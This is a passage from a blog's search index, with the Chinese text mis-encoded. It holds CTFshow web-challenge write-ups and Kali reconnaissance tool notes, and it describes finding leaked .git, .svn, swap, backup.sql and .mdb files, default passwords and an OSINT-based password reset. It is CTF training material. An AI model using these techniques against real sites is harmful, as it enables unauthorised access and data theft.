title="ä½¿ç”¨ç‰¹å®šç½‘å¡è¿›è¡Œæ¢æµ‹"></a>ä½¿ç”¨ç‰¹å®šç½‘å¡è¿›è¡Œæ¢æµ‹</h3><ul><li><code>nmap -e ç½‘å¡(interface) ç›®æ ‡</code></li></ul><h3 id="å¯¹æ¯”æ¢æµ‹ç»“æœ"><a href="#å¯¹æ¯”æ¢æµ‹ç»“æœ" class="headerlink" title="å¯¹æ¯”æ¢æµ‹ç»“æœ"></a>å¯¹æ¯”æ¢æµ‹ç»“æœ</h3><ul><li>åˆ©ç”¨ndiffå·¥å…·</li><li><code>ndiff file1 file2</code></li><li>ä¾‹å­ï¼š<code>ndiff kali.xml kali2.xml</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Webå…¥é—¨_SSRF</title>
    <link href="/2022/07/26/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF/"/>
    <url>/2022/07/26/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_SSRF.html">http://118.178.126.49/blogs/CTF_show_Webå…¥é—¨_SSRF.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Webå…¥é—¨_XSS</title>
    <link href="/2022/07/24/CTF_show_Web%E5%85%A5%E9%97%A8_XSS/"/>
    <url>/2022/07/24/CTF_show_Web%E5%85%A5%E9%97%A8_XSS/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_XSS.html">http://118.178.126.49/blogs/CTF_show_Webå…¥é—¨_XSS.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Webå…¥é—¨_sqlæ³¨å…¥</title>
    <link href="/2022/07/21/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/07/21/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5.html">http://118.178.126.49/blogs/CTF_show_Webå…¥é—¨_sqlæ³¨å…¥.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Webå…¥é—¨_phpç‰¹æ€§</title>
    <link href="/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/"/>
    <url>/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7.html">http://118.178.126.49/blogs/CTF_show_Webå…¥é—¨_phpç‰¹æ€§.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Webå…¥é—¨_æ–‡ä»¶åŒ…å«</title>
    <link href="/2022/07/13/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/07/13/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html">http://118.178.126.49/blogs/CTF_show_Webå…¥é—¨_æ–‡ä»¶åŒ…å«.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Webå…¥é—¨_å‘½ä»¤æ‰§è¡Œ</title>
    <link href="/2022/07/12/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2022/07/12/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html">http://118.178.126.49/blogs/CTF_show_Webå…¥é—¨_å‘½ä»¤æ‰§è¡Œ.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Kali_ä¿¡æ¯æœé›†</title>
    <link href="/2022/07/12/kali_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2022/07/12/kali_%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Kali-ä¿¡æ¯æœé›†"><a href="#Kali-ä¿¡æ¯æœé›†" class="headerlink" title="Kali_ä¿¡æ¯æœé›†"></a>Kali_ä¿¡æ¯æœé›†</h1><h2 id="DNSåˆ†ææ”¶é›†åˆ†æ"><a href="#DNSåˆ†ææ”¶é›†åˆ†æ" class="headerlink" title="DNSåˆ†ææ”¶é›†åˆ†æ"></a>DNSåˆ†ææ”¶é›†åˆ†æ</h2><h3 id="dnsmap"><a href="#dnsmap" class="headerlink" title="dnsmap"></a>dnsmap</h3><ul><li>dnsmap qq.com options<ul><li>-w <wordlist-file></wordlist-file></li><li>-r <regular-results-file></regular-results-file></li><li>-c <csv-results-file></csv-results-file></li><li>-d <delay-millisecs></delay-millisecs></li><li>-i <ips-to-ignore> ï¼ˆipså°±æ˜¯å¿½ç•¥é˜²å¾¡ç³»ç»Ÿï¼‰</ips-to-ignore></li></ul></li></ul><h3 id="dnsrecon"><a href="#dnsrecon" class="headerlink" title="dnsrecon"></a>dnsrecon</h3><ul><li><p>Options:</p><ul><li><p>-h help</p></li><li><p>-d â€“domain <domain>              Domain to Target for enumeration</domain></p></li><li><p>-r â€“range <range>                    IP range for reverse look-up brute force in formats (first-last) or in (range&#x2F;bitmask) åçœè§£æçˆ†ç ´çš„IPèŒƒå›´</range></p></li><li><p>-n â€“name_server <name>          ä¸æä¾›ä»»ä½•SOAä¿¡æ¯ï¼ˆDNSè®°å½•ç±»å‹ï¼‰æ—¶è¿›è¡Œçš„DNSæœåŠ¡å™¨çš„ä½¿ç”¨</name></p></li><li><p>-D â€“dictionary <file></file></p></li><li><p>-f                                                  è¿‡æ»¤è¾“å‡º</p></li><li><p>-t -type  <types>                        </types></p><div class="code-wrapper"><pre><code class="hljs elm">types:&#123;std æ ‡å‡†æ¨¡å¼ï¼Œrvl å¯¹æŒ‡å®šçš„<span class="hljs-type">CIDR</span> <span class="hljs-type">IP</span>èŒƒå›´åæŸ¥ï¼Œbrt ä½¿ç”¨åŸŸåå’Œä¸»æœºçš„å­—å…¸æ–‡ä»¶ï¼Œsrv åˆ—å‡ºsrvè®°å½•ï¼Œgoo ä½¿ç”¨è°·æ­Œï¼Œsnoop ä¼šå¯¹ä¸€ä¸ªåŸŸåçš„æ‰€æœ‰<span class="hljs-type">NS</span>æœåŠ¡å™¨æ‰§è¡Œç¼“å­˜å—…æ¢å’Œ-<span class="hljs-type">D</span>ä¸€èµ·ä½¿ç”¨ï¼Œtld ç§»é™¤æ‰€æŒ‡åŸŸåçš„<span class="hljs-type">TLD</span>ä¿¡æ¯æµ‹è¯•æ‰€æœ‰çš„<span class="hljs-type">TLD</span>(é¡¶çº§åŸŸå)æ³¨å†Œåœ¨<span class="hljs-type">IANA</span>ï¼Œ-a æ ‡å‡†æšä¸¾ä¸‹æ‰§è¡Œ<span class="hljs-type">AXFR</span>ï¼Œ-s æ‰§è¡Œåå‘<span class="hljs-type">SPF</span>è®°å½•æŸ¥è¯¢ï¼Œå¯¹äºipv4åœ°å€èŒƒå›´-g ä½¿ç”¨è°·æ­Œ-w æŸ¥è¯¢<span class="hljs-type">WHOIS</span>å’Œ<span class="hljs-type">IP</span>çš„åå‘è§£æ-z æ‰§è¡Œ<span class="hljs-type">DNSSEC</span> <span class="hljs-type">Zone</span> <span class="hljs-type">Walk</span><span class="hljs-comment">--threads </span><span class="hljs-comment">--lifetime</span>ä¿å­˜ä»€ä¹ˆç±»å‹æ–‡ä»¶<span class="hljs-comment">--db</span><span class="hljs-comment">--xml</span><span class="hljs-comment">--iw</span>-c,<span class="hljs-comment">--csv</span>-j,<span class="hljs-comment">--json</span>&#125;</code></pre></div></li></ul></li></ul><h3 id="fierce"><a href="#fierce" class="headerlink" title="fierce"></a>fierce</h3><ul><li><p>ä½œç”¨ï¼šæŸ¥æ‰¾ç›®æ ‡çš„IPå’Œä¸»æœºåï¼Œè¿›è¡Œå­åŸŸåçˆ†ç ´</p></li><li><p>ç‰¹ç‚¹ï¼šå¯ä»¥è®¾ç½®å¤šä¸ªä¸è¿ç»­çš„IPåœ°å€ï¼Œå¯ä»¥å¤šçº¿ç¨‹æƒŠå–œ</p></li><li><p>å‚æ•°</p><div class="code-wrapper"><pre><code class="hljs diff"><span class="hljs-deletion">-delay ä¸æŒ‰ç…§æŒ‡å®šæ¬¡æ•°</span><span class="hljs-deletion">-dns æŒ‡å®šä¸€ä¸ªåŸŸå</span><span class="hljs-deletion">-dnsfile åæŸ¥æ—¶å€™ä½¿ç”¨çš„å­—å…¸</span><span class="hljs-deletion">-dnsserver ä½¿ç”¨ç‰¹å®šçš„DNSæœåŠ¡å™¨</span><span class="hljs-deletion">-file A file you would like to output to be logged to</span><span class="hljs-deletion">-fulloutput è¾“å‡ºwebserverè¿”å›çš„ä¿¡æ¯ï¼Œä½†æ˜¯è¦å’Œ-connectè¿ç”¨</span><span class="hljs-deletion">-help</span><span class="hljs-deletion">-nopattern ä¸æŒ‰ç…§æœç´¢æ¨¡å¼æŸ¥æ‰¾é‚»è¿‘çš„ä¸»æœº</span><span class="hljs-deletion">-range æŒ‡å®šipèŒƒå›´</span><span class="hljs-deletion">-search ä¸è¯¦</span><span class="hljs-deletion">-supress </span><span class="hljs-deletion">-tcptimeout æŒ‡å®šè¶…æ—¶æ—¶é—´</span><span class="hljs-deletion">-threads æŒ‡å®šçº¿ç¨‹</span></code></pre></div></li></ul><h3 id="lbdï¼ˆload-balance-detectorï¼‰"><a href="#lbdï¼ˆload-balance-detectorï¼‰" class="headerlink" title="lbdï¼ˆload balance detectorï¼‰"></a>lbdï¼ˆload balance detectorï¼‰</h3>]]></content>
    
    
    <categories>
      
      <category>kali</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Webå…¥é—¨_çˆ†ç ´</title>
    <link href="/2022/07/11/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4/"/>
    <url>/2022/07/11/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4.html">http://118.178.126.49/blogs/CTF_show_Webå…¥é—¨_çˆ†ç ´.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Webå…¥é—¨_ä¿¡æ¯æœé›†</title>
    <link href="/2022/07/10/CTF-show-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2022/07/10/CTF-show-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEBå…¥é—¨"><a href="#WEBå…¥é—¨" class="headerlink" title="WEBå…¥é—¨"></a>WEBå…¥é—¨</h2><hr><h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><ul><li>æŸ¥çœ‹æºä»£ç ç›´æ¥æ‰¾åˆ°</li></ul><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><ul><li>ç«ç‹æµè§ˆå™¨ç½‘å€ä¸Šè¾“å…¥configï¼šaboutåæ‰“å¼€è®¾ç½®ç¦æ­¢jsï¼ˆç»•è¿‡jså‰ç«¯éªŒè¯ï¼‰</li><li>æŸ¥çœ‹æºç </li></ul><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><ul><li>bpæŠ“åŒ…</li><li>æŠŠGETæ”¹æˆPOST</li><li>Repeatäº†ä¸€ä¸‹å°±å‡ºæ¥flagäº†</li></ul><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><ul><li>æ ¹æ®æç¤ºçœ‹ä¸€ä¸‹robotsåè®®</li><li>çœ‹åˆ°flagishere.txtè®¿é—®ä¸€ä¸‹</li><li>å‡ºflag</li></ul><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><ul><li>è®¿é—®index.phpsåä¸‹è½½æ–‡ä»¶æ‰“å¼€å³å¾—flag</li></ul><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><ul><li>ä½¿ç”¨diesearchæ‰«å‡º<a href="http://www.zip/">www.zip</a></li><li>è®¿é—®ä¸‹è½½å¾—åˆ°flag</li></ul><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><ul><li>æç¤ºï¼šç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦</li><li>è”æƒ³ï¼šç”¨ä»€ä¹ˆæ§åˆ¶ç‰ˆæœ¬ï¼Ÿgitï¼</li><li>è®¿é—® <em><strong>.git&#x2F;</strong></em> å¾—flag</li></ul><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><ul><li>æç¤ºï¼šç‰ˆæœ¬æ§åˆ¶å¾ˆé‡è¦ï¼ˆæ€ä¹ˆåˆæ˜¯è¿™ä¸ªï¼Ÿï¼‰</li><li>è”æƒ³ï¼šé™¤äº†gitè¿˜æœ‰ä»€ä¹ˆå¯ä»¥æ§åˆ¶ç‰ˆæœ¬ï¼Ÿsvn!</li><li>è®¿é—® ***.svn&#x2F;***å¾—flag</li></ul><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><ul><li>æç¤ºï¼šå‘ç°ç½‘é¡µæœ‰ä¸ªé”™åˆ«å­—ï¼Ÿèµ¶ç´§åœ¨ç”Ÿäº§ç¯å¢ƒvimæ”¹ä¸‹ï¼Œä¸å¥½ï¼Œæ­»æœºäº†</li><li>è”æƒ³ï¼švimæ­»æœºï¼Ÿè¿™ä¸ç•™ä¸‹vimç¼“å­˜<ul><li><strong>çŸ¥è¯†ç‚¹</strong>ï¼švim äº¤æ¢æ–‡ä»¶å<br>åœ¨ä½¿ç”¨vimæ—¶ä¼šåˆ›å»ºä¸´æ—¶ç¼“å­˜æ–‡ä»¶ï¼Œå…³é—­vimæ—¶ç¼“å­˜æ–‡ä»¶åˆ™ä¼šè¢«åˆ é™¤ï¼Œå½“vimå¼‚å¸¸é€€å‡ºåï¼Œå› ä¸ºæœªå¤„ç†ç¼“å­˜æ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¼“å­˜æ–‡ä»¶æ¢å¤åŸå§‹æ–‡ä»¶å†…å®¹<br>ä»¥ index.php ä¸ºä¾‹ï¼šç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸º .index.php.swp<br>å†æ¬¡æ„å¤–é€€å‡ºåï¼Œå°†ä¼šäº§ç”Ÿåä¸º .index.php.swo çš„äº¤æ¢æ–‡ä»¶<br>ç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸º .index.php.swn</li></ul></li><li>æ­¤é¢˜è®¿é—®.index.php.swpä¸‹è½½æ‰“å¼€å¾—flag</li></ul><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><ul><li>çœ‹cookie</li></ul><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><ul><li><a href="https://zijian.aliyun.comä¸ŠæŸ¥ä¸€ä¸‹flag.ctfshow.com/">https://zijian.aliyun.comä¸ŠæŸ¥ä¸€ä¸‹flag.ctfshow.com</a></li></ul><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><ul><li>æç¤ºï¼šæœ‰æ—¶å€™ç½‘ç«™ä¸Šçš„å…¬å¼€ä¿¡æ¯ï¼Œå°±æ˜¯ç®¡ç†å‘˜å¸¸ç”¨å¯†ç </li><li>æ‰“å¼€ç½‘å€ï¼ˆå¤ªé…·ç‚«ï¼ŒæŒ‰äº†5minå•¥ç»“æœæ²¡æœ‰ï¼‰</li><li>æ€è€ƒï¼šåœ¨å“ªç™»é™†ï¼Ÿè¯•ä¸€ä¸‹loginæ²¡æœ‰ å†æ€è€ƒ è¯•ä¸€ä¸‹adminå‘ç°æ‰¾åˆ°ç™»é™†å£</li><li>æ€è€ƒï¼šå¯†ç åœ¨å“ªï¼Ÿ</li><li>æ€è€ƒæç¤ºï¼šæœ€ä¸‹é¢æ‰¾åˆ°ä¸ªæ•°å­—å°è¯•ä¸€ä¸‹ï¼Œflagï¼</li></ul><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><ul><li><p>æç¤ºï¼šæŠ€æœ¯æ–‡æ¡£ä¸­ä¸è¦å‡ºç°æ•æ„Ÿä¿¡æ¯ï¼Œéƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒååŠæ—¶ä¿®æ”¹é»˜è®¤å¯†ç </p></li><li><p>æ‰“å¼€é“¾æ¥ï¼Œå¼€å§‹é—²é€›ï¼Œç¿»åˆ°æœ€åº•ä¸‹ï¼ŒæŠ€æœ¯æ–‡æ¡£ï¼ŒæŠ€æœ¯æ–‡æ¡£ï¼ŒæŠ€æœ¯æ–‡æ¡£ã€‚ã€‚ã€‚documentï¼Ÿï¼ç‚¹å¼€</p></li><li><p>easy</p></li><li><p>ç‚¹äº†ä¸€ä¸‹é“¾æ¥ï¼Œè¿›ä¸å»ï¼Ÿï¼Ÿï¼Ÿï¼</p></li><li><p><img src="https://img-blog.csdnimg.cn/8983f88e7e264e92bd52ba5ad94c45e5.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>å†çœ‹çœ‹é“¾æ¥ã€‚ã€‚ã€‚ <strong>your-domain</strong></p></li><li><p>å­¦è¿‡è‹±è¯­ dddd</p></li><li><p>æ‹¿ä¸‹</p></li></ul><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><ul><li><p>æç¤ºï¼šæœ‰æ—¶å€™æºç é‡Œé¢å°±ä¸ç»æ„é—´æ³„æ¼é‡è¦ä¿¡æ¯ï¼ˆeditorï¼‰çš„ä¿¡æ¯ï¼Œé»˜è®¤é…ç½®å®³æ­»äºº</p></li><li><p>dirsearchä¸€ä¸‹å‘ç°&#x2F;editor</p></li><li><p>æœæ–­è®¿é—®ä¸€ä¸‹</p></li><li><p><img src="https://img-blog.csdnimg.cn/42ede35c3e304845887c7801a102507f.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>æ‡µé€¼1s</p></li><li><p>ç‚¹æäº¤404ï¼ˆcaoï¼Œæ€ä¹ˆæ˜¯404ï¼‰ã€‚ã€‚ã€‚å†æƒ³æƒ³</p></li><li><p>ä¸Šä¼ å›¾ç‰‡æ‰“å¼€</p></li><li><p><img src="https://img-blog.csdnimg.cn/875fc3b0c3104b95bcafc5c20d718436.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>æ„Ÿè§‰æ²¡ä»€ä¹ˆç”¨å•Šï¼Œå´©æºƒing</p></li><li><p>éšä¾¿ç‚¹ä¸€ä¸‹<strong>å›¾ç‰‡ç©ºé—´</strong> å“å—¨</p></li><li><p><img src="https://img-blog.csdnimg.cn/57a646bf776f4c17a3af3cd2052aa94f.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>è¿™ä¸å°±æ˜¯linuxæœåŠ¡å™¨çš„æ–‡ä»¶å½¢å¼å—ï¼Ÿæƒ³èµ·æç¤º<strong>é»˜è®¤åœ°å€</strong></p></li><li><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;nothinghere&#x2F;fl000g.txt</p></li><li><p>æ‰¾åˆ°åœ°å€è®¿é—®å¾—flagï¼ï¼ï¼</p></li></ul><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><ul><li>æç¤ºï¼šå…¬å¼€çš„ä¿¡æ¯æ¯”å¦‚é‚®ç®±ï¼Œå¯èƒ½é€ æˆä¿¡æ¯æ³„æ¼ï¼Œäº§ç”Ÿä¸¥é‡åæœ</li><li>æ‰“å¼€ç½‘é¡µåœ¨ä¸‹é¢æ‰¾åˆ°ä¸€ä¸ªqqé‚®ç®±</li><li>è¯•ä¸€ä¸‹è®¿é—®&#x2F;admin</li><li>éœ€è¦å¯†ç </li><li>å¿˜è®°å¯†ç </li><li>æç¤ºéœ€è¦é—®ç­”éªŒè¯ï¼ˆéœ€è¦åœ°å€ï¼‰</li><li>qqæœç´¢æ”¹qqå·å‘ç°åœ°å€ä¸ºè¥¿å®‰</li><li>è¾“å…¥åé‡ç½®å¯†ç ç™»å½•è·å–flag</li></ul><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><ul><li><p>çœ‹äº†åˆ«äººçš„WP</p></li><li><p><strong>çŸ¥è¯†ç‚¹</strong>ï¼ˆæŸ¥é˜…å¯çŸ¥ï¼‰ï¼šphpæ¢é’ˆï¼šç”¨æ¥æ£€æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç­‰</p></li><li><p>&#x2F;tz.phpè®¿é—®é›…é»‘PHPæ¢é’ˆ</p></li><li><p>ç‚¹å‡»phpinfo</p></li><li><p>ctrl+Fæœç´¢ctfshowæ‰¾åˆ°flag</p></li><li><p>é•¿è§è¯†äº†æ</p></li></ul><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><ul><li>æç¤ºï¼šå¤‡ä»½çš„sqlæ–‡ä»¶ä¼šæ³„æ¼æ•æ„Ÿä¿¡æ¯</li><li>dirsearchæœäº†ä¸€éæ‰¾ä¸åˆ°</li><li>çœ‹äº†wp</li><li>åŸæ¥æ˜¯backup.sql</li><li>é•¿ç‚¹è§è¯†</li></ul><h3 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h3><ul><li><p>æ‰“å¼€é“¾æ¥ï¼šå°é¸Ÿæ¸¸æˆï¼ˆğŸ¤¯å¥½éš¾ï¼Œ101è¿™æ˜¯äººèƒ½åˆ°çš„åˆ†æ•°ï¼Ÿï¼‰</p></li><li><p>ä¼°æ‘¸æ˜¯jså†™çš„å°æ¸¸æˆ</p></li><li><p>æŸ¥çœ‹æºä»£ç </p></li><li><p><img src="https://img-blog.csdnimg.cn/abb13751e7084b9890488709af0d6c66.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>score&gt;100?å—¯ï¼Ÿè¿™ä¸æ˜¯æˆ‘å¿ƒå¿ƒå¿µå¿µçš„101å—</p></li><li><p><img src="https://img-blog.csdnimg.cn/b1109420a39e443db3a875347249d708.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></li><li><p>ç¼–ç ä¸€ä¸‹</p></li><li><p>è®¿é—®110.php</p></li><li><p>flag</p></li></ul><h3 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h3><ul><li>æŸ¥çœ‹æºä»£ç jséƒ¨åˆ†çœ‹åˆ°usernameå’Œpazzword</li><li>æˆ‘è¿™é‡Œç›´æ¥è¾“å…¥æ¡†é‡Œè¾“è¿‡ä¸å»</li><li>æŠ“äº†ä¸ªåŒ…</li><li>å¾—åˆ°flag</li></ul><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><ul><li>æç¤ºï¼šmdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ¶æ„çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„æ¼ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†</li><li>ç›²åŒº çœ‹wp</li><li>è®¿é—®&#x2F;db&#x2F;db.mdb</li><li>ä¸‹è½½æ–‡ä»¶è®°äº‹æœ¬æ‰“å¼€å¾—flag</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/07/10/hello-world/"/>
    <url>/2022/07/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre></div><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo server</code></pre></div><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo generate</code></pre></div><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo deploy</code></pre></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
